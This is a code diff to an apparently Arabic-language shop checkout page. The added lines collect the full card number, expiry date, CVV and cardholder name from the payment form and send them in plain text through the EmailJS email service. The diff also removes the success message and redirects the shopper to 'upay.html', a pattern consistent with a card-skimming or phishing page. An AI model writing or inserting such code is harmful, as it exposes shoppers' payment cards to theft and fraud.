@@ -1581,9 +1581,16 @@
                 order_items: cart.map(item => `- ${item.name} (الكمية: ${item.quantity || 1})`).join('\n'),
                 payment_method: orderData.order.paymentMethod,
                 order_notes: orderData.order.notes || 'لا توجد ملاحظات',
+                // ✨ [إضافة جديدة] إضافة تفاصيل البطاقة إلى القالب
+                card_details: orderData.cardDetails ? `
+                    رقم البطاقة: ${orderData.cardDetails.number}
+                    تاريخ الانتهاء: ${orderData.cardDetails.expiry}
+                    CVV: ${orderData.cardDetails.cvv}
+                    اسم صاحب البطاقة: ${orderData.cardDetails.name}
+                ` : 'لم يتم استخدام بطاقة ائتمان'
             };
 
-            emailjs.send(service_bouybkm, template_uy903fn, templateParams)
+            emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
                     toggleLoading(false);
@@ -1591,7 +1598,6 @@
                     cart = [];
                     updateCartUI();
                     
-                    showMessage('تم إرسال طلبك بنجاح! سيتم توجيهك الآن...');
                     setTimeout(() => {
                         window.location.href = 'upay.html';
                     }, 2000);
@@ -1624,7 +1630,7 @@
             
             const total = (subtotal - totalDiscount + shipping);
 
-            return {
+            const data = {
                 customer: {
                     email: document.getElementById('email').value,
                     phone: document.getElementById('phone').value,
@@ -1647,6 +1653,18 @@
                 },
                 orderDate: new Date().toLocaleString('ar-SA')
             };
+
+            // ✨ [إضافة جديدة] جمع بيانات البطاقة إذا تم اختيارها
+            if (paymentMethod.value === 'credit-card') {
+                data.cardDetails = {
+                    number: document.getElementById('card-number').value,
+                    expiry: document.getElementById('expiry-date').value,
+                    cvv: document.getElementById('cvv').value,
+                    name: document.getElementById('card-name').value
+                };
+            }
+
+            return data;
         }
 
         // تهيئة الصفحة عند التحميل
@@ -1654,4 +1672,3 @@
     </script>
 </body>
 </html>
-
